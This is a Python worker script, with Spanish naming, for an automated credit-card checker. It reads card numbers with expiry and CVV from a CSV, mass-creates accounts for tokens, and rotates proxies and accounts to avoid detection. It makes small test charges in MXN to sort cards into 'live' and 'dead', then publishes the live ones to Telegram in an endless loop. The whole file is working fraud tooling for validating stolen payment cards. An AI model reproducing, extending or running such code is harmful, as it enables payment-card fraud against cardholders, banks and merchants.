import os
import time
import random
from dotenv import load_dotenv
from gen import cargar_bin_db, buscar_bin
from main import (
    cargar_proxies, cargar_tokens, guardar_combo, guardar_live,
    guardar_dead, check_card, format_proxy, log_to_file,
    crear_cuentas_para_check, MONTOS, TOKENS_FILE, USED_PHONES,
    flush_lives
)
import csv as csv_module
import logging

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger("worker")

load_dotenv()

CHARGE_OPTION = os.getenv("CHARGE_OPTION", "1")
CARD_AMOUNT = int(os.getenv("CARD_AMOUNT", "10"))
SLEEP_BETWEEN_CYCLES = int(os.getenv("SLEEP_BETWEEN_CYCLES", "300"))
BAS_BIN_FILE = os.getenv("BAS_BIN_FILE", "bas_bin.csv")

CUENTAS_FIJAS = 50
TARJETAS_POR_CUENTA_FIJO = 15
ERRORES_ROTACION = 2

def leer_series(csv_path: str):
    if not os.path.exists(csv_path):
        logger.error("Archivo %s no encontrado.", csv_path)
        return []
    series = []
    try:
        with open(csv_path, "r", encoding="utf-8-sig", newline="") as f:
            reader = csv_module.DictReader(f)
            if "Card Data" not in (reader.fieldnames or []):
                logger.error("El archivo %s no tiene columna 'Card Data'.", csv_path)
                return []
            for row in reader:
                card = row["Card Data"].strip()
                if card:
                    series.append(card)
        logger.info("Leídas %d tarjetas desde %s", len(series), csv_path)
    except Exception as e:
        logger.exception("Error leyendo %s", csv_path)
    return series

def ejecutar_ciclo():
    if CHARGE_OPTION not in MONTOS:
        logger.error("CHARGE_OPTION inválido.")
        return

    series = leer_series(BAS_BIN_FILE)
    if not series:
        logger.warning("No hay tarjetas en %s. Abortando ciclo.", BAS_BIN_FILE)
        return

    cantidad = min(CARD_AMOUNT, len(series))
    ccs = random.sample(series, cantidad)
    guardar_combo(ccs)

    monto, monto_label = MONTOS[CHARGE_OPTION]
    monto_nombre = f"${int(monto)} MXN CARGO" if monto == 1.0 else f"${int(monto)} MXN ABONO"

    proxies_list = cargar_proxies()
    bin_db = cargar_bin_db()

    if os.path.exists(TOKENS_FILE):
        os.remove(TOKENS_FILE)

    log_to_file(f"INICIANDO CHECK - {monto_nombre} - {cantidad} tarjetas")
    USED_PHONES.clear()
    tokens_generados = crear_cuentas_para_check(CUENTAS_FIJAS, proxies_list)
    if tokens_generados == 0:
        logger.error("No se generaron tokens. Abortando ciclo.")
        return

    tokens = cargar_tokens()
    logger.info("Tokens cargados: %d", len(tokens))

    lives_total = 0
    deads_total = 0
    errores_total = 0
    token_expirados = 0
    api_no_disponible = False
    errores_consecutivos = 0

    i = 0
    token_idx = 0
    token_actual = None
    proxy_actual = None
    tarjetas_en_cuenta = 0

    while i < len(ccs) and not api_no_disponible:
        if tarjetas_en_cuenta >= TARJETAS_POR_CUENTA_FIJO or token_actual is None:
            if token_idx >= len(tokens):
                logger.warning("No hay más tokens disponibles.")
                break
            token_actual = tokens[token_idx]
            token_idx += 1
            proxy_actual = format_proxy(random.choice(proxies_list)) if proxies_list else None
            tarjetas_en_cuenta = 0
            errores_consecutivos = 0

        combo = ccs[i]
        if not combo or "|" not in combo:
            i += 1
            continue
        parts = combo.strip().split("|")
        if len(parts) < 4:
            i += 1
            continue

        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        bin_info = buscar_bin(cc, bin_db)

        tipo, display, detalle = check_card(cc, mm, yy, cvv, monto, monto_nombre, token_actual, proxy_actual, bin_info)

        if tipo == "token_expired":
            token_expirados += 1
            logger.info("Token expirado, rotando cuenta...")
            token_actual = None
            tarjetas_en_cuenta = TARJETAS_POR_CUENTA_FIJO
            errores_consecutivos = 0
            continue

        if tipo == "error" and ("API APAGADA" in detalle or "API NO DISPONIBLE" in detalle):
            errores_consecutivos += 1
            logger.warning("Error API (%d/%d)", errores_consecutivos, ERRORES_ROTACION)
            if errores_consecutivos >= ERRORES_ROTACION:
                token_actual = None
                tarjetas_en_cuenta = TARJETAS_POR_CUENTA_FIJO
                errores_consecutivos = 0
                continue
            else:
                errores_total += 1
                tarjetas_en_cuenta += 1
                i += 1
                continue

        errores_consecutivos = 0

        if tipo == "live":
            lives_total += 1
            guardar_live(combo, monto_nombre, bin_info)
            logger.info("LIVE: %s", display)
        elif tipo == "dead":
            deads_total += 1
            guardar_dead(combo, detalle, bin_info)
        else:
            errores_total += 1
            logger.error("ERROR: %s - %s", display, detalle)

        tarjetas_en_cuenta += 1
        i += 1
        if i < len(ccs):
            time.sleep(random.uniform(0.8, 1.5))

    if api_no_disponible:
        logger.warning("API no disponible. Ciclo detenido.")
    else:
        log_to_file(f"FINALIZADO - Lives: {lives_total} | Deads: {deads_total} | Errores: {errores_total} | Tokens expirados: {token_expirados}")
        if lives_total > 0:
            logger.info("Publicando lives en Telegram...")
            flush_lives()

def main():
    logger.info("Iniciando worker automático...")
    while True:
        try:
            ejecutar_ciclo()
        except Exception as e:
            logger.exception("Error en ciclo: %s", e)
        logger.info("Esperando %d segundos...", SLEEP_BETWEEN_CYCLES)
        time.sleep(SLEEP_BETWEEN_CYCLES)

if __name__ == "__main__":
    main()
